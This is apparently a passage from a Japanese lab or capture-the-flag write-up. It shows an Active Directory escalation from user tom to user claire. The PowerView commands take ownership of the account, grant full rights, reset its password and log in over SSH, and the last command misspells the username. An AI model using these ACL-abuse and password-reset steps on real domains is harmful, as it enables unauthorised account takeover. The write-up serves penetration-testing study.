## tom -> claire

tomは**WriteOwner**の権限をclaireに対して持ってる。

![tom_priv](https://user-images.githubusercontent.com/85237728/149606075-736fe964-aea7-4bd0-a42d-a7ab5e606799.png)

claireのオーナーをtomに設定：

```
PS C:\Users\tom> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
```

tomに、claireのことをGenericAllできるように権限を与える：

```
PS C:\Users\tom> Add-DomainObjectAcl -PrincipalIdentity tom -TargetIdentity claire -Rights All
```

これでtomはclaireのパスワードを再設定できる：

```
PS C:\Users\tom> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\Users\tom> Set-DomainUserPassword -Identity claire -AccountPassword $UserPassword
```

このclaireのクリデンシャルでclaireにssh接続：

```
┌──(kali㉿kali)-[~]
└─$ sshpass -p 'Password123!' ssh cliare@10.10.10.77
```
